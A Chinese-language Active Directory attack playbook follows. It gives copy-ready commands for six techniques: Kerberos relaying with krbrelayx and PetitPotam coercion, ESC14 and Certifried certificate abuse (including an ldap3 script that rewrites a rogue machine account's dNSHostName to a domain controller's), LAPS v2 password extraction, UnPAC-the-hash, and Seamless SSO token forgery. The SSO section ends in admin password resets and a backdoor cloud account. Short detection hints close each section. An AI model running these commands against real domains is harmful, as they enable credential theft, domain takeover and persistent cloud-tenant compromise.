# 域新打法:2022 年后新增域渗透技术

本文件汇总近年(2022–2025)出现的六大新打法:Kerberos 中继、ESC14、Certifried、Windows LAPS v2、UnPAC-the-hash、Azure AD Seamless SSO。它们共同特点是"绕过既有防线而不是撞防线"——Kerberos 中继绕开全部 NTLM 中继防护,ESC14/Certifried 绕开证书强映射,LAPS v2 换了存储与加密,UnPAC-the-hash 直接从 PAC 里掏哈希,Seamless SSO 把本地域权限直接兑换成云租户权限。本文件命令均可直接复制,占位符用尖括号标注(如 `<域名>` `<DC的IP>` `<DC主机名>`);所有工具参数均为本机 `--help`/源码实测(2026-09 快照)。

本文件工具:krbrelayx(/usr/bin,已实测)、certipy v5.1.0(pipx)、impacket 套件、nxc(netexec)、coercer、PetitPotam(~/tools/src/PetitPotam)、AADInternals(~/tools/src/AADInternals)

## Kerberos 中继(krbrelayx + CVE-2022-33679)— 绕过 NTLM 中继防线的强制认证中继

原理:Kerberos 认证(AP-REQ)传统上"不可中继"——服务票据绑定 SPN,authenticator 里带目标主机名。CVE-2022-33679 打破这一点:攻击者作为中间人先在 SPNEGO 协商里掐掉 NTLM,强迫客户端对自己走 Kerberos;当 KDC 仍接受 RC4-HMAC 弱加密协商时(CVE-2022-33679),攻击者可解密/篡改票据里 RC4 加密的 authenticator,把目标主机名改写后把这条"完整有效"的 Kerberos 认证转发给 LDAP/SMB——目标端看到的是签名封印俱全的合法 Kerberos 会话,LDAP 签名、EPA、channel binding 等**全部 NTLM 中继防线对它无效**(那些防线只检查 NTLM)。配合 printer bug/PetitPotam 强制机器认证,可把任意域机器账户中继到 LDAP 配 RBCD,或中继到 AD CS 直接要证书。

来源:dirkjanm(Dirk-jan Mollema)"Relaying Kerberos" 系列 + CVE-2022-33679(2022-11-08 补丁修复);利用工具 krbrelayx(/usr/bin/krbrelayx,`--help` 已实测)

```bash
# 第一步:启动中继监听(SMB+HTTP),把收到的 Kerberos 认证中继到域控 LDAP
krbrelayx -t ldap://<DC主机名>.<域名> -ip <本机IP> -l loot/    # -t 只接受主机名(--help 原文:only HOSTNAMES are valid),无 -t 时仅存票据不中继
krbrelayx -t ldaps://<DC主机名>.<域名> --delegate-access        # 最常用组合:中继机器账户到 LDAP 后直接对该机器账户配置 RBCD 委派
krbrelayx -t ldap://<DC主机名>.<域名> --escalate-user '<低权用户>'   # 改走 ACL 提权路线:直接给指定用户拔高权限
krbrelayx -t smb://<目标主机名> -hashes :<NT哈希>                # 中继到 SMB(目标必须未强制 SMB 签名,这条防线仍有效)
krbrelayx -t <CA主机名> --adcs --template '<模板名>' --altname 'administrator@<域名>' -v '<受害者账户或机器名$>'   # 中继到 AD CS 要证书(ESC1 类;中继 DC 时模板需指定 DomainController)
krbrelayx -tf targets.txt -w                                    # 多目标:目标列表文件 + 热更新

# 第二步:触发强制认证(三选一,详见 10 号文档中继链)
coercer coerce -u '<用户>' -p '<密码>' -d <域名> -l <本机IP> --target-single <目标机IP>   # 批量触发 MS-RPRN/MS-EVEN 等(coercer 已装)
python3 ~/tools/src/PetitPotam/PetitPotam.py -d <域名> -u '<用户>' -p '<密码>' <本机IP> <目标机IP>   # 经典 PetitPotam
impacket-rpcdump -u '<用户>@<域名>' -p '<密码>' <目标机IP> | grep -i 'MS-RPRN\|MS-EVEN'   # 先探测目标有没有可打的认证强制器

# 第三步(RBCD 收尾):krbrelayx --delegate-access 后会得到可用的委派配置,后续 S4U2Self/S4U2Proxy 走 12 号文档委派小节
```

参数速查(`--help` 实测):

- `-t <TARGET>`:中继目标,**只认主机名**,形如 `ldap://dc01.corp.local`、`smb://server:445`;不填则把收到的票据存盘(`-f ccache|kirbi`,`-l loot目录`)
- `-ip <本机IP>`:绑定 SMB/HTTP 监听的网卡 IP(多网卡必填);`-6` 同时监听 IPv6
- LDAP 攻击选项:`--delegate-access`(RBCD)/ `--escalate-user <用户>`(ACL 提权)/ `--add-computer [名字]` / `--dump-laps` / `--dump-gmsa` / `--no-dump --no-da --no-acl`(全关只做中继)
- AD CS 选项:`--adcs` 开启证书中继,`--template <模板>`(默认按账户名尾缀选 Machine/User),`--altname <SAN>`(ESC1/ESC6 冒充),`-v <受害者>`(指定以谁的名义要证书)
- Kerberos 密钥参数(`-p`/`-hashes`/`-aesKey`/`-s`)只在"无 -t 存票据 + unconstrained delegation 利用"场景用,纯中继不需要

注意: 与 NTLM 中继防线的差异——LDAP 签名强制、Extended Protection for Authentication、channel binding、`ldaps` 要求全都拦不住 Kerberos 中继(它们只作用于 NTLM);Kerberos 中继自己的限制:①SMB 签名强制仍能挡 SMB 目标;②`-t` 必须写主机名(纯 Kerberos 不认裸 IP);③触发的是机器账户认证时,后续动作权限受该机器账户限制(RBCD 是最通用出口)。适用条件:**2022-11-08 补丁之前的域**(CVE-2022-33679 修复后 KDC 拒绝 RC4 协商降级,中继路线失效),且攻击者能把认证流量引到自己(需与目标机网通)。审计提示:DC 上 4769 事件的票加密类型 `0x17`(rc4-hmac)异常增多、SPN 与实际登录目标不匹配;目标机 4624 出现"向非常规主机发起的 Kerberos 认证";MS-RPRN/MS-EVEN 打印机事件(88 警告)指向陌生主机——三者都是强信号,建议对 `0x17` 加密类型直接告警。

## ESC14 — 证书模板名称碰撞/弱映射变体(certipy find 已内置检测)

原理一句话:证书与 AD 对象的映射存在多条"按名称/按属性"的弱匹配路径,当攻击者可控的对象属性或模板名能与高权模板/高权主体发生碰撞时,低权签发的证书即可被当成高权凭据使用。

来源:ly4k(Oliver Lyak)certipy v5.x 新增检测;本机 certipy v5.1.0 源码已核(`commands/find.py` 第 1008 行起把 ESC14 判定以独立键追加输出)

```bash
certipy find -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -vulnerable -stdout | sed -n '/ESC14/,$p'   # 枚举并直接翻到 ESC14 判定段(-stdout 文本模式必加,见下)
grep -A 20 'ESC14' adcs_Certipy.txt          # 离线翻找上一次 find 的文本输出
# 命中后的利用链视 find 输出里标注的具体变体而定,常见两路:
certipy req -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -ca '<CA名>' -template '<命中模板名>' -upn 'administrator@<域名>'   # 路线一:碰撞模板可自填 SAN → 同 ESC1 姿势冒充
certipy account -u '<用户>@<域名>' -p '<密码>' -dc-ip <DC的IP> -user '<可控账户>' -upn 'administrator@<域名>'                # 路线二:改账户属性制造弱映射碰撞(altSecurityIdentities 思路)
```

参数速查(certipy req 选项 `req -h` 实测,certipy find 见 11 号文档):

- `-template '<模板名>'`:find 标 ESC14 的模板(默认 `User`);`-ca '<CA名>'`:RPC/DCOM 申请必填
- `-upn` / `-dns` / `-sid`:冒充对象的 SAN 三种写法(用户 UPN / 主机 DNS / 对象 SID,`-sid` 最稳)
- `-web` / `-dcom`:申请协议切换(Web Enrollment / DCOM,默认 RPC)
- certipy account:`-user <目标账户>` 后跟 `-upn/-dns/-spn` 等属性修改项,用于主动制造映射碰撞

注意: ESC14 是一族"弱映射变体"而非单一漏洞,certipy 的判定说明会直接写在输出的 ESC14 段里,**以 find 输出的变体描述为准**选择利用路线;本机 v5.1.0 源码实测的坑:ESC14 只追加在**文本/stdout 输出**(`find.py:1008` 仅 text 路径写入),`-json` 生成的 JSON 里没有这个键——所以查 ESC14 必须带 `-stdout` 或默认文本输出,别只 grep JSON。适用条件:取决于变体,普遍前提是攻击者能注册某模板或可写某 AD 对象属性(常与 ESC4 可写模板、ESC7 CA 权限组合出现)。审计提示:5136/5137 事件里模板属性与账户 `altSecurityIdentities`/UPN 的异常修改;CA 上非常规模板的证书签发(事件 4886/79);例行 `certipy find -vulnerable | grep ESC14` 为零才算达标(溯源自检同 11 号文档做法)。

## Certifried(CVE-2022-26923)— 机器账户 dNSHostName 篡改,Machine 模板证书冒充域控

原理:补丁前 AD CS 对机器账户证书不做 `dNSHostName` 唯一性校验——普通域用户(默认 `MachineAccountQuota`=10)即可创建机器账户,把它的 `dNSHostName` 改成域控 FQDN,再申请 `Machine` 模板证书:证书 SAN 就是域控主机名,PKINIT 认证后即"是"域控机器账户,UnPAC-the-hash 直接吐出域控的 NT 哈希,DC 机器账户可 DCSync(见 12 号文档)。

来源:Oliver Lyak(ly4k)Certifried;利用链:impacket-addcomputer + python ldap3(或 PowerView)改属性 + certipy

```bash
# 第一步:创建机器账户(impacket 已装 /usr/bin/impacket-addcomputer)
impacket-addcomputer '<域名>/<用户>:<密码>' -computer-name 'EVIL$' -computer-pass '<新机器密码>' -dc-ip <DC的IP>

# 第二步:改 dNSHostName 为域控 FQDN(python/ldap3 思路;PowerView 等价命令见下)
python3 - <<'EOF'
from ldap3 import Server, Connection, ALL, MODIFY_REPLACE
c = Connection(Server('<DC的IP>', get_info=ALL), user='<域名>\\<用户>', password='<密码>', authentication='NTLM')
c.bind()
dn = 'CN=EVIL,CN=Computers,DC=<域>,DC=<本地>'
c.modify(dn, {'servicePrincipalName': [(MODIFY_REPLACE, [])]})                                  # 先清 SPN,否则 dNSHostName 改成 DC FQDN 会撞 SPN 唯一性报错
c.modify(dn, {'dNSHostName': [(MODIFY_REPLACE, ['<DC主机名>.<域名>'])]})                        # 冒充域控
print(c.result)
EOF
# PowerView 等价思路(Windows 跳板上):
#   Set-DomainObject -Identity 'EVIL$' -Clear 'serviceprincipalname'
#   Set-DomainObject -Identity 'EVIL$' -Set @{'dnshostname'='<DC主机名>.<域名>'}

# 第三步:Machine 模板拿"域控"证书 → PKINIT 换哈希(certipy req 选项 -h 实测)
certipy req -u '<域名>/EVIL$' -p '<新机器密码>' -dc-ip <DC的IP> -ca '<CA名>' -template Machine    # 产出 evil.pfx,SAN=<DC主机名>.<域名>
certipy auth -pfx evil.pfx -dc-ip <DC的IP>          # PKINIT + UnPAC-the-hash:直接输出域控机器账户 NT 哈希
nxc smb <DC的IP> -u 'DC机器名$' -H '<上一步NT哈希>' --dc-ip <DC的IP>   # 验证战果;DC 机器账户可直接 DCSync(12 号文档)
```

参数速查:

- impacket-addcomputer:`-computer-name 'EVIL$'`(尾缀 `$` 是机器账户语法)、`-computer-pass`、`-dc-ip`;建在默认 Computers 容器
- certipy req:`-template Machine`(机器模板默认已发布)、`-ca '<CA名>'`(find 输出里找);本路**不需要** `-dns`——SAN 自动取 `dNSHostName`
- certipy auth:`-pfx evil.pfx`,输出 NT 哈希 + ccache(见 11 号文档 ESC1 小节同名用法)

注意: 适用条件:**2022-05-10 补丁(2022 年 5 月星期二补丁,修复 CVE-2022-26923)之前的域**,且 `MachineAccountQuota` 未改为 0(默认 10,或攻击者本就有建机权限);打完补丁后 `dNSHostName` 唯一性校验落地,直改 DC FQDN 直接报错。改属性前先清 SPN 是硬前提(否则 LDAP 拒绝修改),打完把 SPN 改回去可减小痕迹。审计提示:4741(新建机器账户,尤其 Computers 容器里的陌生名字)→ 5136(`dNSHostName`/`servicePrincipalName` 连续修改,改完的值指向已存在的域控)→ 4886/79(Machine 模板证书签发给新机器账户)——这条三连事件链就是 Certifried 的完整指纹,建议做成检测规则。

## Windows LAPS v2(msLAPS-EncryptedPassword)— 新版本地管理员密码的读取与解密

原理与新旧差异:旧版 LAPS(2015/2019)把明文密码写在 `ms-MCS-AdmPwd` 属性,能读就能用;2023 年的 Windows LAPS(v2)默认加密存储——`msLAPS-EncryptedPassword` 存的是 DPAPI-NG(`CMS EnvelopedData`)加密 blob,密钥体系是 AD 域密钥(MS-GKDI KDS 根密钥派生 KEK → 解出 CEK → 解密出 JSON 明文),**读取权限和加密是两层:LDAP 能读到 blob 还需要域上下文能走 GKDI 解密**;另有 `msLAPS-Password` 属性(未加密模式的明文 JSON)与旧版 `ms-MCS-AdmPwd` 并存。nxc 的 laps 模块已原生支持三属性自动识别 + v2 自动解密(源码实测见下)。

来源:微软 Windows LAPS(2023 GA);本机 nxc laps 模块源码已核:`/usr/lib/python3/dist-packages/nxc/protocols/ldap/laps.py` 内置 `LAPSv2Extract` 类(封装 EncryptedPasswordBlob → MS-GKDI GetKey RPC → compute_kek → unwrap → 解密全流程)

```bash
# 一键:nxc 自动识别 v1/v2 并解密(模块源码实测:过滤器同时查三种属性,命中 msLAPS-EncryptedPassword 自动走 GKDI 解密)
nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps                          # 拉取当前账号有权读的所有 LAPS 密码(v2 自动解密)
nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps -o COMPUTER='WIN-*'       # 模块选项 COMPUTER:按机器名过滤,支持通配符(源码实测 options 只此一项,默认 *)
nxc ldap <DC的IP> -u '<用户>' -p '<密码>' -d <域名> -M laps -k --kdcHost <DC主机名>.<域名>   # Kerberos 认证姿势(GKDI 解密同样走 Kerberos)

# 手工 ldapsearch:先看属性有没有值、是哪种模式(解密再交给 nxc 或手工链路)
ldapsearch -x -H ldap://<DC的IP> -D '<用户>@<域名>' -w '<密码>' \
  -b 'DC=<域>,DC=<本地>' '(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(msLAPS-Password=*)(ms-MCS-AdmPwd=*)))' \
  name msLAPS-EncryptedPassword msLAPS-Password ms-MCS-AdmPwd    # 三个属性一起查,一次分清版本与加密模式
```

参数速查:

- nxc laps 模块选项(源码 `modules/laps.py` 实测):仅 `COMPUTER`(机器名或通配符,默认 `*`),传法 `-o COMPUTER='WIN10-01'`
- 输出格式(源码实测):`Computer:<机器名> User:<管理员名> Password:<明文>`;v2 解密后从 JSON 取 `n`(账户名)与 `p`(密码)两个字段
- GKDI 解密链(源码实测调用序):`EncryptedPasswordBlob` 解包 → CMS `EnvelopedData` 解析 → `hept_map(MSRPC_UUID_GKDI)` 动态端口 → `GkdiGetKey`(opnum 0)取 `GroupKeyEnvelope` → `compute_kek` → `unwrap_cec` → 解出明文
- 手工解密可参照 13 号文档 DPAPI 小节的 `dpapi_ng` 思路(impacket 的 `EncryptedPasswordBlob/KeyIdentifier/compute_kek/unwrap_cec` 即该库接口)

注意: 适用条件:目标域部署了 Windows LAPS(2023+,需 Server/Client 更新到支持版本)且**当前账号在 LAPS 授权读取组里**(密码历史 `msLAPS-PasswordHistory` 同理);旧版域(`ms-MCS-AdmPwd`)同一条 nxc 命令直接出明文。v2 的加密不挡"有权读的人"——它防的是 LDAP 流量侧与越权读取,权限模型仍是核心。审计提示:对 `msLAPS-EncryptedPassword` 的 4662 读取审计(需开对象访问审核)出现非常规账户;DC 上 MS-GKDI GetKey RPC 调用来源异常(正常只有 LAPS 管理端/授权用户);防御侧建议把读取权限收敛到最小组并监控 COMPUTER 过滤式批量查询。

## UnPAC-the-hash — 从 PAC 里直接掏 NT 哈希(证书/哈希免 NTLM 互换)

原理:PKINIT(证书换 Kerberos 票据)时,KDC 为兼容旧 NTLM 系统,会在 PAC 里放一个 `PAC_CREDENTIAL_INFO` 缓冲区(封着用户的 NTLM 凭据/NT 哈希);持 TGT 的客户端再发起一次 S4U2Self 或 User-to-User 请求拿服务票据,从票据 PAC 中解出这个缓冲区就得到明文 NT 哈希——**证书直接换哈希,全程不碰 NTLM 协议**,NTLM 审计与防护全数旁路。这是"为什么 ADCS 打下来能拿到哈希"的底层答案:certipy auth 从 v4 起默认就把这一步做完。

来源:Charlie Clark(@exploitph)UnPAC-the-hash;certipy auth 已内置(见 11 号文档 ESC1 链,auth 输出的 NT 哈希即来源于此)

```bash
certipy auth -pfx <证书>.pfx -dc-ip <DC的IP>     # 一条龙:PKINIT 拿 TGT + 自动 UnPAC-the-hash,直接输出 NT 哈希并保存 <账户>.ccache(本机 v5.1.0 默认行为)
certipy auth -pfx evil.pfx -dc-ip <DC的IP> -kirbi   # 同上,票据另存 Rubeus/mimikatz 的 kirbi 格式
KRB5CCNAME=<账户>.ccache nxc smb <目标IP> -u '<账户>' --use-kcache   # 哈希/票据任选一路横向(见 10 号文档)
```

手工验证思路(无 certipy 时,验证"证书确实能换哈希"):Rubeus `asktgt /certificate:<证书>.pfx /getcredentials /show`(证书换 TGT 后顺带从 PAC 取凭据);kekeo 的 `tgt::pac`(请求 U2U 票据并解 PAC);Linux 侧等价流程 = `certipy auth` 内部两步——PKINIT 取 TGT,再对 `krbtgt` 发 U2U 请求解析 `PAC_CREDENTIAL_INFO`。验证要点:输出的 NT 哈希能过 `nxc smb -H` 即闭环。

参数速查:

- certipy auth:`-pfx <文件>`(可配 `-pfx-password`)、`-dc-ip`、`-kirbi`(票据格式)、`-ldap-shell`(Schannel 直连 LDAPS,不换哈希的替代路线)
- 手工链关键点:PAC_CREDENTIAL_INFO 只在 PKINIT 签发的 TGT 里出现(普通密码登录的 PAC 没有),所以入口必须先是证书

注意: 适用条件:域默认启用 PKINIT(2008+ 无需额外配置),任何"能换 TGT 的证书"(客户端认证 EKU)都适用——这是设计行为而非可整体修补的漏洞;它与 Certifried 是天然组合(Certifried 拿"域控证书",UnPAC-the-hash 吐"域控哈希")。审计提示:4768/4769 里**证书预认证**(ticket options 含 PKINIT 位,`0x40810000` 段)的请求突然增多、机器账户出现证书型 TGT 请求、同一证书短时间内反复换票——建议对"证书认证 + 随即 U2U/S4U2Self"的组合行为告警。

## Seamless SSO / Azure AD Connect — DCSync AZUREADSSOACC$,伪造云会话接管租户

原理:租户启用 Seamless SSO(桌面 SSO,密码哈希同步/直通认证均可配)后,本地 AD 会多出一个 `AZUREADSSOACC$` 计算机账户;Azure AD 的 `autologon.microsoftazuread-sso.com` 端点接受该账户的 Kerberos 票据为"任意同步用户"签发云会话。攻击链:本地域已有 DCSync 权限 → 拖出 `AZUREADSSOACC$` 的 NT 哈希 → 用它向本地 KDC 申请该账户票据 → 把票据递给微软端点换 MS Graph 令牌(含刷新令牌)→ 以任意同步用户身份操作云,包括**重置同步管理员密码**实现全租户接管。本地 DA 到云全局管理员一步直达。

来源:Dr. Nestori Syynimaa(@DrAzureAD)AADInternals;工具在 ~/tools/src/AADInternals(PowerShell 模块,命令均为 `Verb-AADIntNoun` 形式)

```powershell
# 第一步:DCSync 提取 AZUREADSSOACC$ 的 NT 哈希(本地 Linux 侧,DSYNC 细节见 12 号文档)
# impacket-secretsdump '<域名>/<用户>:<密码>' -dc-ip <DC的IP> | grep -i azureadssoacc
# 或 mimikatz:lsadump::dcsync /user:AZUREADSSOACC$

# 第二步:AADInternals 伪造云会话(需一台能连本地 KDC 的 Windows 跳板,模块在 ~/tools/src/AADInternals)
Import-Module .\AADInternals.psm1
$passwd = ConvertTo-SecureString '<AZUREADSSOACC的NT哈希>' -AsPlainText -Force          # RC4 密钥即 NT 哈希,按明文口令形式传入
$creds  = New-Object System.Management.Automation.PSCredential('<域名>\AZUREADSSOACC$', $passwd)
$kerberos_token = Invoke-AADIntKerberosInteraction -Domain <域名> -Credentials $creds -KerberosTokenFormat Raw   # 向本地 KDC 申请 AZUREADSSOACC$ 的 Kerberos 票据
$at = Get-AADIntAccessTokenForMSGraph -KerberosToken $kerberos_token -IncludeRefreshToken $true   # 票据换 MS Graph 访问令牌 + 刷新令牌
Get-AADIntUsers -AccessToken $at | Format-Table UserPrincipalName,DisplayName   # 枚举云用户,确认接管面(找同步上来的管理员)
Set-AADIntUserPassword -AccessToken $at -UserPrincipalName '<同步管理员的UPN>' -Password '<新密码>'   # 重置同步管理员密码 → 租户接管(纯云账户不受此路影响)
New-AADIntUser -AccessToken $at -UserPrincipalName 'backup@<租户域名>' -Password '<密码>' -DisplayName 'svc-backup'   # 或直接留一个云后门账户
```

参数速查(链路按 AADInternals 公开用法;函数名可在 ~/tools/src/AADInternals 里 `grep -r 'function.*AADInt'` 复核):

- `Invoke-AADIntKerberosInteraction`:`-Domain`(本地 AD 域)、`-Credentials`(AZUREADSSOACC$ 凭据对象)、`-KerberosTokenFormat Raw`(后续换令牌所需格式)
- `Get-AADIntAccessTokenForMSGraph`:`-KerberosToken`(上一步输出)、`-IncludeRefreshToken $true`(拿刷新令牌,长效);旧文档常见 `Get-AADIntAccessTokenForAADGraph` 已随 AAD Graph 停用退役,用 MSGraph 版
- `Get-AADIntUsers` / `Set-AADIntUserPassword` / `New-AADIntUser`:统一吃 `-AccessToken`;改密码/建户输出可用 `Get-AADIntUsers` 复核

注意: 适用条件:①租户开启了 Seamless SSO(联合域 ADFS 不走此路,那套见 15 号文档);②攻击者已拿下本地 DCSync(即已是 Domain Admin——本条本质是"本地域权限兑换云权限");③目标管理员是**同步账户**(密码哈希同步对象),纯云管理员不在此路射程内。防御现实:`AZUREADSSOACC$` 的密码**没有常规轮换手段**(微软设计如此),泄露即长期有效,只能靠拆 Seamless SSO 重配。审计提示:本地 DC 上 `AZUREADSSOACC$` 的 4769(请求 SPN 指向 autologon.microsoftazuread-sso.com 的票据)来源异常、secretsdump 式 DCSync 复制事件(4662 复制权限访问);云侧看"同一 SSO 通道短时间覆盖大量不同 UPN 的登录"、非常规地理位置的 Interactive/刷新令牌兑换。缓解:全局管理员启用 MFA + 条件访问,云管理员与同步账户分离。
